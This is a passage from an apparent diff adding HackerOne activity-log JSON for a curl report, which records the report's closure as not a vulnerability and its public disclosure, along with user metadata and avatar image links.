O7%2FB4%2BHBrjXvsrTZbojVL4%2Bt7ibqDMhfMgAZuTahnGjkXxQQX2HZw1hHbfSDxQ9mxOvu3ugWtKQt5YPYtbcsn6A96bkuxX0I4SLBC%2FQpAb7axi%2BPoKyGsJpmMEEgBKtZLaOl%2F5U7mV0YLoORuICw3VvahxgBYu2pBFBA2NhIx1BD8xWJFp8rQT2e1x3O2X2hO7Iwv97sqeveAOJutSXQ28ep8rchOr9k3lmEDlizITm%2FKSkA3Tk3UUWHx9Wye2KV%2B8nPeF4Mnzd4VtqzxQU9XezNFErk%2FGvYOQspY5zgQ3A7%2BdO7kOjTdP88LQbuuIR1KWlusrB4gf0IifUknGS1OQ6nyaFPKjPZWl5SoAhsdB45n%2FtOP2Pk%2F%2Bf23eZ8ekcPR6KomBQHDCR4OY%2Bus9GX08xh8cCPdqDmlNgajbWKmIGrtWk1Kz9LnqjQA5Rfzs56EOYx%2BObU0Xh6aIzxlJY2WePQsRb5FpKl2VMKR9%2BDVFFr0sVdYfVW3NU5wreujTa2ofUWw7ITrLjjbYvRIwFiAbB5OInx93UnLpEWA4wv1qZB649IJ%2BFFFADD2hrWnBjqyAR2PdV6SL51EidXYWyT0f0pKLukb9DVp%2B%2FuG%2FFhQlWrL5C%2Fh7mJtECL4hGQZQA35s7YnJcQSpzKEB8jSodqQ20ETjQmbMoHUdAQ0dVsHVo4gwXVTz43T3pENGKyhX2fX%2FQveR9P7xXXGPZCiDWEK199jEzdCIvba7ZkPuhpgzxCprsHPxszgHgo2Xzw8V7rytA0mV%2BhhcwrBJHo2drrcgmwq5GNSS6%2Fuw9DbFtvAvm6JL4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ead19f2c99099635129c4b14cb1f945a7011f309f0d2c4362d41ed8fd52e2d82"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16677902,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNotApplicable",
+            "message": "Fair enough. Closed as not a vulnerability.",
+            "automated_response": false,
+            "created_at": "2022-05-12T23:03:06.204Z",
+            "updated_at": "2022-05-12T23:03:06.204Z",
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16677904,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-05-12T23:03:16.069Z",
+            "updated_at": "2022-05-12T23:03:16.069Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "nyymi",
+                "cleared": false,
+                "verified": false,
+                "url": "/nyymi",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16679998,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-05-13T06:44:08.260Z",
+            "updated_at": "2022-05-13T06:44:08.260Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PJWT3OC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070209Z&X-Amz-Expires=621&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbXZrgxxh8yDYQLaIX8q13Y63Lo%2FN579Tziw%2Bf483g7AiBQo0t02RBmcjZaKYOdhky6k95lmebSLQb4aW10oKgs9Cq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEmm8lf%2FNmZYMTkkOKo8Felzq5ucherjY1gjQ4Od8%2FLfnQkxpEGyNVf1QeXuZMAkcJJYqwLSwIJTmJrmer4tNSkXgL3ZAiO3ZJ54RxttpKm7i0oglQ6wPU%2FVzmSLW%2Fq59O1PWHR5Xm7KeOjJho28q3UCVD%2Byu4gJgmTn35wvsInBgS%2FKSUrFdNwMF%2FhJ%2B2N7fieZuTX32gZf9Egnmg9jzGRMUN9yS5gyNc1G%2Fp8UTsLZEXc9AfOXxT4nI95c5hCrK5gr8bkqK1T3E9A84SAL2WuLD%2BdayfN%2BjvOcm9FsQoMLc%2FL5seF10DmEtras1rL8XjepI22AO7%2FB4%2BHBrjXvsrTZbojVL4%2Bt7ibqDMhfMgAZuTahnGjkXxQQX2HZw1hHbfSDxQ9mxOvu3ugWtKQt5YPYtbcsn6A96bkuxX0I4SLBC%2FQpAb7axi%2BPoKyGsJpmMEEgBKtZLaOl%2F5U7mV0YLoORuICw3VvahxgBYu2pBFBA2NhIx1BD8xWJFp8rQT2e1x3O2X2hO7Iwv97sqeveAOJutSXQ28ep8rchOr9k3lmEDlizITm%2FKSkA3Tk3UUWHx9Wye2KV%2B8nPeF4Mnzd4VtqzxQU9XezNFErk%2FGvYOQspY5zgQ3A7%2BdO7kOjTdP88LQbuuIR1KWlusrB4gf0IifUknGS1OQ6nyaFPKjPZWl5SoAhsdB45n%2FtOP2Pk%2F%2Bf23eZ8ekcPR6KomBQHDCR4OY%2Bus9GX08xh8cCPdqDmlNgajbWKmIGrtWk1Kz9LnqjQA5Rfzs56EOYx%2BObU0Xh6aIzxlJY2WePQsRb5FpKl2VMKR9%2BDVFFr0sVdYfVW3NU5wreujTa2ofUWw7ITrLjjbYvRIwFiAbB5OInx93UnLpEWA4wv1qZB649IJ%2BFFFADD2hrWnBjqyAR2PdV6SL51EidXYWyT0f0pKLukb9DVp%2B%2FuG%2FFhQlWrL5C%2Fh7mJtECL4hGQZQA35s7YnJcQSpzKEB8jSodqQ20ETjQmbMoHUdAQ0dVsHVo4gwXVTz43T3pENGKyhX2fX%2FQveR9P7xXXGPZCiDWEK199jEzdCIvba7ZkPuhpgzxCprsHPxszgHgo2Xzw8V7rytA0mV%2BhhcwrBJHo2drrcgmwq5GNSS6%2Fuw9DbFtvAvm6JL4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ead19f2c99099635129c4b14cb1f945a7011f309f0d2c4362d41ed8fd52e2d82"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16679999,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-05-13T06:44:08.399Z",
+            "updated_at": "2022-05-13T06:44:08.399Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PJWT3OC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070209Z&X-Amz-Expires=621&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDbXZrgxxh8yDYQLaIX8q13Y63Lo%2FN579Tziw%2Bf483g7AiBQo0t02RBmcjZaKYOdhky6k95lmebSLQb4aW10oKgs9Cq7BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMEmm8lf%2FNmZYMTkkOKo8Felzq5ucherjY1gjQ4Od8%2FLfnQkxpEGyNVf1QeXuZMAkcJJYqwLSwIJTmJrmer4tNSkXgL3ZAiO3ZJ54RxttpKm7i0oglQ6wPU%2FVzmSLW%2Fq59O1PWHR5Xm7KeOjJho28q3UCVD%2Byu4gJgmTn35wvsInBgS%2FKSUrFdNwMF%2FhJ%2B2N7fieZuTX32gZf9Egnmg9jzGRMUN9yS5gyNc1G%2Fp8UTsLZEXc9AfOXxT4nI95c5hCrK5gr8bkqK1T3E9A84SAL2WuLD%2BdayfN%2BjvOcm9FsQoMLc%2FL5seF10DmEtras1rL8XjepI22AO7%2FB4%2BHBrjXvsrTZbojVL4%2Bt7ibqDMhfMgAZuTahnGjkXxQQX2HZw1hHbfSDxQ9mxOvu3ugWtKQt5YPYtbcsn6A96bkuxX0I4SLBC%2FQpAb7axi%2BPoKyGsJpmMEEgBKtZLaOl%2F5U7mV0YLoORuICw3VvahxgBYu2pBFBA2NhIx1BD8xWJFp8rQT2e1x3O2X2hO7Iwv97sqeveAOJutSXQ28ep8rchOr9k3lmEDlizITm%2FKSkA3Tk3UUWHx9Wye2KV%2B8nPeF4Mnzd4VtqzxQU9XezNFErk%2FGvYOQspY5zgQ3A7%2BdO7kOjTdP88LQbuuIR1KWlusrB4gf0IifUknGS1OQ6nyaFPKjPZWl5SoAhsdB45n%2FtOP2Pk%2F%2Bf23eZ8ekcPR6KomBQHDCR4OY%2Bus9GX08xh8cCPdqDmlNgajbWKmIGrtWk1Kz9LnqjQA5Rfzs56EOYx%2BObU0Xh6aIzxlJY2WePQsRb5FpKl2VMKR9%2BDVFFr0sVdYfVW3NU5wreujTa2ofUWw7ITrLjjbYvRIwFiAbB5OInx93UnLpEWA4wv1qZB649IJ%2BFFFADD2hrWnBjqyAR2PdV6SL51EidXYWyT0f0pKLukb9DVp%2B%2FuG%2FFhQlWrL5C%2Fh7mJtECL4hGQZQA35s7YnJcQSpzKEB8jSodqQ20ETjQmbMoHUdAQ0dVsHVo4gwXVTz43T3pENGKyhX2fX%2FQveR9P7xXXGPZCiDWEK199jEzdCIvba7ZkPuhpgzxCprsHPxszgHgo2Xzw8V7rytA0mV%2BhhcwrBJHo2drrcgmwq5GNSS6%2Fuw9DbFtvAvm6JL4E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ead19f2c99099635129c4b14cb1f945a7011f309f0d2c4362d41ed8fd52e2d82"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
